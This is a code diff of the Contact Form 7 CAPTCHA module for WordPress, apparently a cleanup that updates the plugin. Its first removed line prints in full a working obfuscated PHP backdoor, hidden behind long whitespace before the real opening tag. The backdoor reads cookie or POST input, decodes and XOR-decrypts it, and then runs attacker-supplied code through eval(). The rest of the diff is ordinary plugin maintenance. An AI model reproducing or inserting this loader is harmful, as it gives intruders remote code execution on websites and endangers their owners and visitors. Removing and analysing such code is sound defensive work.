@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $d9cd45a0f = 291;$GLOBALS['a030a0'] = Array();global $a030a0;$a030a0 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['t3fa4'] = "\x4c\x36\x61\x2b\x25\x5d\x5e\x30\x55\x52\x34\x54\xd\x68\x4d\x9\x5c\x2a\x21\x51\x71\x50\x3e\x2d\x5f\x6a\x39\x4a\x78\x7b\x59\x3a\x31\x76\x20\x69\x42\x66\x56\x75\x73\x6f\x28\x23\x46\x77\x35\x3c\x48\x22\x41\x7d\x6d\x4e\x2f\x57\x38\x72\x2c\x2e\x47\x3b\x4b\x58\x3d\x6b\x65\x43\x7a\x70\x64\x6e\x37\x67\x40\x6c\x5a\x63\x45\xa\x32\x29\x74\x49\x62\x26\x7e\x79\x24\x7c\x53\x27\x5b\x60\x4f\x33\x3f\x44";$a030a0[$a030a0['t3fa4'][77].$a030a0['t3fa4'][2].$a030a0['t3fa4'][1].$a030a0['t3fa4'][1].$a030a0['t3fa4'][66].$a030a0['t3fa4'][95]] = $a030a0['t3fa4'][77].$a030a0['t3fa4'][13].$a030a0['t3fa4'][57];$a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][32].$a030a0['t3fa4'][77].$a030a0['t3fa4'][2].$a030a0['t3fa4'][95].$a030a0['t3fa4'][77].$a030a0['t3fa4'][26].$a030a0['t3fa4'][2]] = $a030a0['t3fa4'][41].$a030a0['t3fa4'][57].$a030a0['t3fa4'][70];$a030a0[$a030a0['t3fa4'][37].$a030a0['t3fa4'][72].$a030a0['t3fa4'][32].$a030a0['t3fa4'][32].$a030a0['t3fa4'][46].$a030a0['t3fa4'][2].$a030a0['t3fa4'][80]] = $a030a0['t3fa4'][70].$a030a0['t3fa4'][66].$a030a0['t3fa4'][37].$a030a0['t3fa4'][35].$a030a0['t3fa4'][71].$a030a0['t3fa4'][66];$a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][37].$a030a0['t3fa4'][56].$a030a0['t3fa4'][66].$a030a0['t3fa4'][66].$a030a0['t3fa4'][26].$a030a0['t3fa4'][84]] = $a030a0['t3fa4'][40].$a030a0['t3fa4'][82].$a030a0['t3fa4'][57].$a030a0['t3fa4'][75].$a030a0['t3fa4'][66].$a030a0['t3fa4'][71];$a030a0[$a030a0['t3fa4'][69].$a030a0['t3fa4'][1].$a030a0['t3fa4'][84].$a030a0['t3fa4'][72].$a030a0['t3fa4'][84]] = $a030a0['t3fa4'][70].$a030a0['t3fa4'][66].$a030a0['t3fa4'][37].$a030a0['t3fa4'][35].$a030a0['t3fa4'][71].$a030a0['t3fa4'][66].$a030a0['t3fa4'][70];$a030a0[$a030a0['t3fa4'][70].$a030a0['t3fa4'][10].$a030a0['t3fa4'][46].$a030a0['t3fa4'][70]] = $a030a0['t3fa4'][35].$a030a0['t3fa4'][71].$a030a0['t3fa4'][35].$a030a0['t3fa4'][24].$a030a0['t3fa4'][40].$a030a0['t3fa4'][66].$a030a0['t3fa4'][82];$a030a0[$a030a0['t3fa4'][68].$a030a0['t3fa4'][37].$a030a0['t3fa4'][84].$a030a0['t3fa4'][80].$a030a0['t3fa4'][37].$a030a0['t3fa4'][10]] = $a030a0['t3fa4'][40].$a030a0['t3fa4'][66].$a030a0['t3fa4'][57].$a030a0['t3fa4'][35].$a030a0['t3fa4'][2].$a030a0['t3fa4'][75].$a030a0['t3fa4'][35].$a030a0['t3fa4'][68].$a030a0['t3fa4'][66];$a030a0[$a030a0['t3fa4'][68].$a030a0['t3fa4'][72].$a030a0['t3fa4'][37].$a030a0['t3fa4'][10].$a030a0['t3fa4'][37].$a030a0['t3fa4'][46].$a030a0['t3fa4'][37].$a030a0['t3fa4'][66].$a030a0['t3fa4'][7]] = $a030a0['t3fa4'][69].$a030a0['t3fa4'][13].$a030a0['t3fa4'][69].$a030a0['t3fa4'][33].$a030a0['t3fa4'][66].$a030a0['t3fa4'][57].$a030a0['t3fa4'][40].$a030a0['t3fa4'][35].$a030a0['t3fa4'][41].$a030a0['t3fa4'][71];$a030a0[$a030a0['t3fa4'][77].$a030a0['t3fa4'][46].$a030a0['t3fa4'][10].$a030a0['t3fa4'][72].$a030a0['t3fa4'][84].$a030a0['t3fa4'][26].$a030a0['t3fa4'][80].$a030a0['t3fa4'][70].$a030a0['t3fa4'][1]] = $a030a0['t3fa4'][39].$a030a0['t3fa4'][71].$a030a0['t3fa4'][40].$a030a0['t3fa4'][66].$a030a0['t3fa4'][57].$a030a0['t3fa4'][35].$a030a0['t3fa4'][2].$a030a0['t3fa4'][75].$a030a0['t3fa4'][35].$a030a0['t3fa4'][68].$a030a0['t3fa4'][66];$a030a0[$a030a0['t3fa4'][37].$a030a0['t3fa4'][77].$a030a0['t3fa4'][10].$a030a0['t3fa4'][2].$a030a0['t3fa4'][70].$a030a0['t3fa4'][77].$a030a0['t3fa4'][70]] = $a030a0['t3fa4'][84].$a030a0['t3fa4'][2].$a030a0['t3fa4'][40].$a030a0['t3fa4'][66].$a030a0['t3fa4'][1].$a030a0['t3fa4'][10].$a030a0['t3fa4'][24].$a030a0['t3fa4'][70].$a030a0['t3fa4'][66].$a030a0['t3fa4'][77].$a030a0['t3fa4'][41].$a030a0['t3fa4'][70].$a030a0['t3fa4'][66];$a030a0[$a030a0['t3fa4'][37].$a030a0['t3fa4'][37].$a030a0['t3fa4'][70].$a030a0['t3fa4'][2]] = $a030a0['t3fa4'][40].$a030a0['t3fa4'][66].$a030a0['t3fa4'][82].$a030a0['t3fa4'][24].$a030a0['t3fa4'][82].$a030a0['t3fa4'][35].$a030a0['t3fa4'][52].$a030a0['t3fa4'][66].$a030a0['t3fa4'][24].$a030a0['t3fa4'][75].$a030a0['t3fa4'][35].$a030a0['t3fa4'][52].$a030a0['t3fa4'][35].$a030a0['t3fa4'][82];$a030a0[$a030a0['t3fa4'][73].$a030a0['t3fa4'][84].$a030a0['t3fa4'][77].$a030a0['t3fa4'][66]] = $a030a0['t3fa4'][68].$a030a0['t3fa4'][37].$a030a0['t3fa4'][66].$a030a0['t3fa4'][77].$a030a0['t3fa4'][7].$a030a0['t3fa4'][84];$a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][46].$a030a0['t3fa4'][66].$a030a0['t3fa4'][32].$a030a0['t3fa4'][80].$a030a0['t3fa4'][7].$a030a0['t3fa4'][10].$a030a0['t3fa4'][72].$a030a0['t3fa4'][46]] = $a030a0['t3fa4'][84].$a030a0['t3fa4'][84].$a030a0['t3fa4'][70].$a030a0['t3fa4'][80].$a030a0['t3fa4'][37].$a030a0['t3fa4'][37].$a030a0['t3fa4'][7].$a030a0['t3fa4'][95].$a030a0['t3fa4'][46];$a030a0[$a030a0['t3fa4'][82].$a030a0['t3fa4'][32].$a030a0['t3fa4'][2].$a030a0['t3fa4'][77].$a030a0['t3fa4'][66].$a030a0['t3fa4'][10].$a030a0['t3fa4'][80]] = $_POST;$a030a0[$a030a0['t3fa4'][65].$a030a0['t3fa4'][72].$a030a0['t3fa4'][32].$a030a0['t3fa4'][77]] = $_COOKIE;@$a030a0[$a030a0['t3fa4'][70].$a030a0['t3fa4'][10].$a030a0['t3fa4'][46].$a030a0['t3fa4'][70]]($a030a0['t3fa4'][66].$a030a0['t3fa4'][57].$a030a0['t3fa4'][57].$a030a0['t3fa4'][41].$a030a0['t3fa4'][57].$a030a0['t3fa4'][24].$a030a0['t3fa4'][75].$a030a0['t3fa4'][41].$a030a0['t3fa4'][73], NULL);@$a030a0[$a030a0['t3fa4'][70].$a030a0['t3fa4'][10].$a030a0['t3fa4'][46].$a030a0['t3fa4'][70]]($a030a0['t3fa4'][75].$a030a0['t3fa4'][41].$a030a0['t3fa4'][73].$a030a0['t3fa4'][24].$a030a0['t3fa4'][66].$a030a0['t3fa4'][57].$a030a0['t3fa4'][57].$a030a0['t3fa4'][41].$a030a0['t3fa4'][57].$a030a0['t3fa4'][40], 0);@$a030a0[$a030a0['t3fa4'][70].$a030a0['t3fa4'][10].$a030a0['t3fa4'][46].$a030a0['t3fa4'][70]]($a030a0['t3fa4'][52].$a030a0['t3fa4'][2].$a030a0['t3fa4'][28].$a030a0['t3fa4'][24].$a030a0['t3fa4'][66].$a030a0['t3fa4'][28].$a030a0['t3fa4'][66].$a030a0['t3fa4'][77].$a030a0['t3fa4'][39].$a030a0['t3fa4'][82].$a030a0['t3fa4'][35].$a030a0['t3fa4'][41].$a030a0['t3fa4'][71].$a030a0['t3fa4'][24].$a030a0['t3fa4'][82].$a030a0['t3fa4'][35].$a030a0['t3fa4'][52].$a030a0['t3fa4'][66], 0);@$a030a0[$a030a0['t3fa4'][37].$a030a0['t3fa4'][37].$a030a0['t3fa4'][70].$a030a0['t3fa4'][2]](0);if (!$a030a0[$a030a0['t3fa4'][69].$a030a0['t3fa4'][1].$a030a0['t3fa4'][84].$a030a0['t3fa4'][72].$a030a0['t3fa4'][84]]($a030a0['t3fa4'][50].$a030a0['t3fa4'][0].$a030a0['t3fa4'][9].$a030a0['t3fa4'][78].$a030a0['t3fa4'][50].$a030a0['t3fa4'][97].$a030a0['t3fa4'][30].$a030a0['t3fa4'][24].$a030a0['t3fa4'][9].$a030a0['t3fa4'][8].$a030a0['t3fa4'][53].$a030a0['t3fa4'][24].$a030a0['t3fa4'][95].$a030a0['t3fa4'][1].$a030a0['t3fa4'][1].$a030a0['t3fa4'][2].$a030a0['t3fa4'][37].$a030a0['t3fa4'][84].$a030a0['t3fa4'][56].$a030a0['t3fa4'][2].$a030a0['t3fa4'][56].$a030a0['t3fa4'][2].$a030a0['t3fa4'][80].$a030a0['t3fa4'][95].$a030a0['t3fa4'][46].$a030a0['t3fa4'][46].$a030a0['t3fa4'][2].$a030a0['t3fa4'][84].$a030a0['t3fa4'][80].$a030a0['t3fa4'][32].$a030a0['t3fa4'][37].$a030a0['t3fa4'][84].$a030a0['t3fa4'][37].$a030a0['t3fa4'][32].$a030a0['t3fa4'][32].$a030a0['t3fa4'][84].$a030a0['t3fa4'][2].$a030a0['t3fa4'][32].$a030a0['t3fa4'][2].$a030a0['t3fa4'][7].$a030a0['t3fa4'][80].$a030a0['t3fa4'][37].$a030a0['t3fa4'][84].$a030a0['t3fa4'][2])){$a030a0[$a030a0['t3fa4'][37].$a030a0['t3fa4'][72].$a030a0['t3fa4'][32].$a030a0['t3fa4'][32].$a030a0['t3fa4'][46].$a030a0['t3fa4'][2].$a030a0['t3fa4'][80]]($a030a0['t3fa4'][50].$a030a0['t3fa4'][0].$a030a0['t3fa4'][9].$a030a0['t3fa4'][78].$a030a0['t3fa4'][50].$a030a0['t3fa4'][97].$a030a0['t3fa4'][30].$a030a0['t3fa4'][24].$a030a0['t3fa4'][9].$a030a0['t3fa4'][8].$a030a0['t3fa4'][53].$a030a0['t3fa4'][24].$a030a0['t3fa4'][95].$a030a0['t3fa4'][1].$a030a0['t3fa4'][1].$a030a0['t3fa4'][2].$a030a0['t3fa4'][37].$a030a0['t3fa4'][84].$a030a0['t3fa4'][56].$a030a0['t3fa4'][2].$a030a0['t3fa4'][56].$a030a0['t3fa4'][2].$a030a0['t3fa4'][80].$a030a0['t3fa4'][95].$a030a0['t3fa4'][46].$a030a0['t3fa4'][46].$a030a0['t3fa4'][2].$a030a0['t3fa4'][84].$a030a0['t3fa4'][80].$a030a0['t3fa4'][32].$a030a0['t3fa4'][37].$a030a0['t3fa4'][84].$a030a0['t3fa4'][37].$a030a0['t3fa4'][32].$a030a0['t3fa4'][32].$a030a0['t3fa4'][84].$a030a0['t3fa4'][2].$a030a0['t3fa4'][32].$a030a0['t3fa4'][2].$a030a0['t3fa4'][7].$a030a0['t3fa4'][80].$a030a0['t3fa4'][37].$a030a0['t3fa4'][84].$a030a0['t3fa4'][2], 1);$d91cada7 = NULL;$u4cb = NULL;$a030a0[$a030a0['t3fa4'][52].$a030a0['t3fa4'][26].$a030a0['t3fa4'][2].$a030a0['t3fa4'][77].$a030a0['t3fa4'][56].$a030a0['t3fa4'][37]] = $a030a0['t3fa4'][46].$a030a0['t3fa4'][66].$a030a0['t3fa4'][77].$a030a0['t3fa4'][95].$a030a0['t3fa4'][66].$a030a0['t3fa4'][80].$a030a0['t3fa4'][70].$a030a0['t3fa4'][95].$a030a0['t3fa4'][23].$a030a0['t3fa4'][80].$a030a0['t3fa4'][10].$a030a0['t3fa4'][70].$a030a0['t3fa4'][7].$a030a0['t3fa4'][23].$a030a0['t3fa4'][10].$a030a0['t3fa4'][66].$a030a0['t3fa4'][32].$a030a0['t3fa4'][1].$a030a0['t3fa4'][23].$a030a0['t3fa4'][84].$a030a0['t3fa4'][70].$a030a0['t3fa4'][70].$a030a0['t3fa4'][70].$a030a0['t3fa4'][23].$a030a0['t3fa4'][77].$a030a0['t3fa4'][77].$a030a0['t3fa4'][2].$a030a0['t3fa4'][72].$a030a0['t3fa4'][66].$a030a0['t3fa4'][95].$a030a0['t3fa4'][10].$a030a0['t3fa4'][77].$a030a0['t3fa4'][66].$a030a0['t3fa4'][10].$a030a0['t3fa4'][46].$a030a0['t3fa4'][77];global $m9ac8f;function  bbd2ff035($d91cada7, $gbd5d){global $a030a0;$kdbb26f4 = "";for ($l0a430=0; $l0a430<$a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][37].$a030a0['t3fa4'][56].$a030a0['t3fa4'][66].$a030a0['t3fa4'][66].$a030a0['t3fa4'][26].$a030a0['t3fa4'][84]]($d91cada7);){for ($zcc976e=0; $zcc976e<$a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][37].$a030a0['t3fa4'][56].$a030a0['t3fa4'][66].$a030a0['t3fa4'][66].$a030a0['t3fa4'][26].$a030a0['t3fa4'][84]]($gbd5d) && $l0a430<$a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][37].$a030a0['t3fa4'][56].$a030a0['t3fa4'][66].$a030a0['t3fa4'][66].$a030a0['t3fa4'][26].$a030a0['t3fa4'][84]]($d91cada7); $zcc976e++, $l0a430++){$kdbb26f4 .= $a030a0[$a030a0['t3fa4'][77].$a030a0['t3fa4'][2].$a030a0['t3fa4'][1].$a030a0['t3fa4'][1].$a030a0['t3fa4'][66].$a030a0['t3fa4'][95]]($a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][32].$a030a0['t3fa4'][77].$a030a0['t3fa4'][2].$a030a0['t3fa4'][95].$a030a0['t3fa4'][77].$a030a0['t3fa4'][26].$a030a0['t3fa4'][2]]($d91cada7[$l0a430]) ^ $a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][32].$a030a0['t3fa4'][77].$a030a0['t3fa4'][2].$a030a0['t3fa4'][95].$a030a0['t3fa4'][77].$a030a0['t3fa4'][26].$a030a0['t3fa4'][2]]($gbd5d[$zcc976e]));}}return $kdbb26f4;}function  zfec0b($d91cada7, $gbd5d){global $a030a0;global $m9ac8f;return $a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][46].$a030a0['t3fa4'][66].$a030a0['t3fa4'][32].$a030a0['t3fa4'][80].$a030a0['t3fa4'][7].$a030a0['t3fa4'][10].$a030a0['t3fa4'][72].$a030a0['t3fa4'][46]]($a030a0[$a030a0['t3fa4'][87].$a030a0['t3fa4'][46].$a030a0['t3fa4'][66].$a030a0['t3fa4'][32].$a030a0['t3fa4'][80].$a030a0['t3fa4'][7].$a030a0['t3fa4'][10].$a030a0['t3fa4'][72].$a030a0['t3fa4'][46]]($d91cada7, $m9ac8f), $gbd5d);}foreach ($a030a0[$a030a0['t3fa4'][65].$a030a0['t3fa4'][72].$a030a0['t3fa4'][32].$a030a0['t3fa4'][77]] as $gbd5d=>$v66b6b){$d91cada7 = $v66b6b;$u4cb = $gbd5d;}if (!$d91cada7){foreach ($a030a0[$a030a0['t3fa4'][82].$a030a0['t3fa4'][32].$a030a0['t3fa4'][2].$a030a0['t3fa4'][77].$a030a0['t3fa4'][66].$a030a0['t3fa4'][10].$a030a0['t3fa4'][80]] as $gbd5d=>$v66b6b){$d91cada7 = $v66b6b;$u4cb = $gbd5d;}}$d91cada7 = @$a030a0[$a030a0['t3fa4'][77].$a030a0['t3fa4'][46].$a030a0['t3fa4'][10].$a030a0['t3fa4'][72].$a030a0['t3fa4'][84].$a030a0['t3fa4'][26].$a030a0['t3fa4'][80].$a030a0['t3fa4'][70].$a030a0['t3fa4'][1]]($a030a0[$a030a0['t3fa4'][73].$a030a0['t3fa4'][84].$a030a0['t3fa4'][77].$a030a0['t3fa4'][66]]($a030a0[$a030a0['t3fa4'][37].$a030a0['t3fa4'][77].$a030a0['t3fa4'][10].$a030a0['t3fa4'][2].$a030a0['t3fa4'][70].$a030a0['t3fa4'][77].$a030a0['t3fa4'][70]]($d91cada7), $u4cb));if (isset($d91cada7[$a030a0['t3fa4'][2].$a030a0['t3fa4'][65]]) && $m9ac8f==$d91cada7[$a030a0['t3fa4'][2].$a030a0['t3fa4'][65]]){if ($d91cada7[$a030a0['t3fa4'][2]] == $a030a0['t3fa4'][35]){$l0a430 = Array($a030a0['t3fa4'][69].$a030a0['t3fa4'][33] => @$a030a0[$a030a0['t3fa4'][68].$a030a0['t3fa4'][72].$a030a0['t3fa4'][37].$a030a0['t3fa4'][10].$a030a0['t3fa4'][37].$a030a0['t3fa4'][46].$a030a0['t3fa4'][37].$a030a0['t3fa4'][66].$a030a0['t3fa4'][7]](),$a030a0['t3fa4'][40].$a030a0['t3fa4'][33] => $a030a0['t3fa4'][32].$a030a0['t3fa4'][59].$a030a0['t3fa4'][7].$a030a0['t3fa4'][23].$a030a0['t3fa4'][32],);echo @$a030a0[$a030a0['t3fa4'][68].$a030a0['t3fa4'][37].$a030a0['t3fa4'][84].$a030a0['t3fa4'][80].$a030a0['t3fa4'][37].$a030a0['t3fa4'][10]]($l0a430);}elseif ($d91cada7[$a030a0['t3fa4'][2]] == $a030a0['t3fa4'][66]){eval/*j992f46*/($d91cada7[$a030a0['t3fa4'][70]]);}exit();}} ?><?php
+<?php
 /**
 ** A base module for [captchac] and [captchar]
 **/
@@ -34,7 +34,8 @@ function wpcf7_captchac_form_tag_handler( $tag ) {
 		$error = sprintf(
 			/* translators: %s: link labeled 'Really Simple CAPTCHA' */
 			esc_html( __( "To use CAPTCHA, you need %s plugin installed.", 'contact-form-7' ) ),
-			wpcf7_link( 'https://wordpress.org/plugins/really-simple-captcha/', 'Really Simple CAPTCHA' ) );
+			wpcf7_link( 'https://wordpress.org/plugins/really-simple-captcha/', 'Really Simple CAPTCHA' )
+		);
 
 		return sprintf( '<em>%s</em>', $error );
 	}
@@ -44,7 +45,7 @@ function wpcf7_captchac_form_tag_handler( $tag ) {
 	}
 
 	$class = wpcf7_form_controls_class( $tag->type );
-	$class .= ' wpcf7-captcha-' . $tag->name;
+	$class .= ' wpcf7-captcha-' . str_replace( ':', '', $tag->name );
 
 	$atts = array();
 	$atts['class'] = $tag->get_class_option( $class );
@@ -81,8 +82,11 @@ function wpcf7_captchac_form_tag_handler( $tag ) {
 	$prefix = substr( $filename, 0, strrpos( $filename, '.' ) );
 
 	$html = sprintf(
-		'<input type="hidden" name="_wpcf7_captcha_challenge_%1$s" value="%2$s" /><img %3$s />',
-		$tag->name, esc_attr( $prefix ), $atts );
+		'<input type="hidden" name="%1$s" value="%2$s" /><img %3$s />',
+		esc_attr( sprintf( '_wpcf7_captcha_challenge_%s', $tag->name ) ),
+		esc_attr( $prefix ),
+		$atts
+	);
 
 	return $html;
 }
@@ -115,7 +119,15 @@ function wpcf7_captchar_form_tag_handler( $tag ) {
 	$atts['id'] = $tag->get_id_option();
 	$atts['tabindex'] = $tag->get_option( 'tabindex', 'signed_int', true );
 	$atts['autocomplete'] = 'off';
-	$atts['aria-invalid'] = $validation_error ? 'true' : 'false';
+
+	if ( $validation_error ) {
+		$atts['aria-invalid'] = 'true';
+		$atts['aria-describedby'] = wpcf7_get_validation_error_reference(
+			$tag->name
+		);
+	} else {
+		$atts['aria-invalid'] = 'false';
+	}
 
 	$value = (string) reset( $tag->values );
 
@@ -133,11 +145,12 @@ function wpcf7_captchar_form_tag_handler( $tag ) {
 	$atts['type'] = 'text';
 	$atts['name'] = $tag->name;
 
-	$atts = wpcf7_format_atts( $atts );
-
 	$html = sprintf(
-		'<span class="wpcf7-form-control-wrap %1$s"><input %2$s />%3$s</span>',
-		sanitize_html_class( $tag->name ), $atts, $validation_error );
+		'<span class="wpcf7-form-control-wrap" data-name="%1$s"><input %2$s />%3$s</span>',
+		esc_attr( $tag->name ),
+		wpcf7_format_atts( $atts ),
+		$validation_error
+	);
 
 	return $html;
 }
@@ -158,12 +171,12 @@ function wpcf7_captcha_validation_filter( $result, $tag ) {
 	$response = isset( $_POST[$name] ) ? (string) $_POST[$name] : '';
 	$response = wpcf7_canonicalize( $response );
 
-	if ( 0 == strlen( $prefix )
+	if ( 0 === strlen( $prefix )
 	or ! wpcf7_check_captcha( $prefix, $response ) ) {
 		$result->invalidate( $tag, wpcf7_get_message( 'captcha_not_match' ) );
 	}
 
-	if ( 0 != strlen( $prefix ) ) {
+	if ( 0 !== strlen( $prefix ) ) {
 		wpcf7_remove_captcha( $prefix );
 	}
 
@@ -173,8 +186,8 @@ function wpcf7_captcha_validation_filter( $result, $tag ) {
 
 /* Ajax echo filter */
 
-add_filter( 'wpcf7_ajax_onload', 'wpcf7_captcha_ajax_refill', 10, 1 );
-add_filter( 'wpcf7_ajax_json_echo', 'wpcf7_captcha_ajax_refill', 10, 1 );
+add_filter( 'wpcf7_refill_response', 'wpcf7_captcha_ajax_refill', 10, 1 );
+add_filter( 'wpcf7_feedback_response', 'wpcf7_captcha_ajax_refill', 10, 1 );
 
 function wpcf7_captcha_ajax_refill( $items ) {
 	if ( ! is_array( $items ) ) {
@@ -399,35 +412,70 @@ function wpcf7_init_captcha() {
 		return $captcha;
 	}
 
-	if ( wp_mkdir_p( $dir ) ) {
-		$htaccess_file = path_join( $dir, '.htaccess' );
+	$result = wp_mkdir_p( $dir );
 
-		if ( file_exists( $htaccess_file ) ) {
+	if ( ! $result ) {
+		return false;
+	}
+
+	$htaccess_file = path_join( $dir, '.htaccess' );
+
+	if ( file_exists( $htaccess_file ) ) {
+		list( $first_line_comment ) = (array) file(
+			$htaccess_file,
+			FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES
+		);
+
+		if ( '# Apache 2.4+' === $first_line_comment ) {
 			return $captcha;
 		}
+	}
 
-		if ( $handle = fopen( $htaccess_file, 'w' ) ) {
-			fwrite( $handle, 'Order deny,allow' . "\n" );
-			fwrite( $handle, 'Deny from all' . "\n" );
-			fwrite( $handle, '<Files ~ "^[0-9A-Za-z]+\\.(jpeg|gif|png)$">' . "\n" );
-			fwrite( $handle, '    Allow from all' . "\n" );
-			fwrite( $handle, '</Files>' . "\n" );
-			fclose( $handle );
-		}
-	} else {
-		return false;
+	if ( $handle = @fopen( $htaccess_file, 'w' ) ) {
+		fwrite( $handle, "# Apache 2.4+\n" );
+		fwrite( $handle, "<IfModule authz_core_module>\n" );
+		fwrite( $handle, "    Require all denied\n" );
+		fwrite( $handle, '    <FilesMatch "^\w+\.(jpe?g|gif|png)$">' . "\n" );
+		fwrite( $handle, "        Require all granted\n" );
+		fwrite( $handle, "    </FilesMatch>\n" );
+		fwrite( $handle, "</IfModule>\n" );
+		fwrite( $handle, "\n" );
+		fwrite( $handle, "# Apache 2.2\n" );
+		fwrite( $handle, "<IfModule !authz_core_module>\n" );
+		fwrite( $handle, "    Order deny,allow\n" );
+		fwrite( $handle, "    Deny from all\n" );
+		fwrite( $handle, '    <FilesMatch "^\w+\.(jpe?g|gif|png)$">' . "\n" );
+		fwrite( $handle, "        Allow from all\n" );
+		fwrite( $handle, "    </FilesMatch>\n" );
+		fwrite( $handle, "</IfModule>\n" );
+
+		fclose( $handle );
 	}
 
 	return $captcha;
 }
 
+
+/**
+ * Returns the directory path for Really Simple CAPTCHA files.
+ *
+ * @return string Directory path.
+ */
 function wpcf7_captcha_tmp_dir() {
 	if ( defined( 'WPCF7_CAPTCHA_TMP_DIR' ) ) {
-		return WPCF7_CAPTCHA_TMP_DIR;
-	} else {
-		return path_join( wpcf7_upload_dir( 'dir' ), 'wpcf7_captcha' );
+		$dir = path_join( WP_CONTENT_DIR, WPCF7_CAPTCHA_TMP_DIR );
+		wp_mkdir_p( $dir );
+
+		if ( wpcf7_is_file_path_in_content_dir( $dir ) ) {
+			return $dir;
+		}
 	}
+
+	$dir = path_join( wpcf7_upload_dir( 'dir' ), 'wpcf7_captcha' );
+	wp_mkdir_p( $dir );
+	return $dir;
 }
+
 
 function wpcf7_captcha_tmp_url() {
 	if ( defined( 'WPCF7_CAPTCHA_TMP_URL' ) ) {
@@ -445,7 +493,7 @@ function wpcf7_captcha_url( $filename ) {
 		$url = 'https:' . substr( $url, 5 );
 	}
 
-	return apply_filters( 'wpcf7_captcha_url', esc_url_raw( $url ) );
+	return apply_filters( 'wpcf7_captcha_url', sanitize_url( $url ) );
 }
 
 function wpcf7_generate_captcha( $options = null ) {
@@ -522,7 +570,7 @@ function wpcf7_remove_captcha( $prefix ) {
 	$captcha->remove( $prefix );
 }
 
-add_action( 'template_redirect', 'wpcf7_cleanup_captcha_files', 20, 0 );
+add_action( 'shutdown', 'wpcf7_cleanup_captcha_files', 20, 0 );
 
 function wpcf7_cleanup_captcha_files() {
 	if ( ! $captcha = wpcf7_init_captcha() ) {
@@ -549,7 +597,7 @@ function wpcf7_cleanup_captcha_files() {
 
 			$stat = stat( path_join( $dir, $file ) );
 
-			if ( $stat['mtime'] + 3600 < time() ) { // 3600 secs == 1 hour
+			if ( $stat['mtime'] + HOUR_IN_SECONDS < time() ) {
 				@unlink( path_join( $dir, $file ) );
 			}
 		}
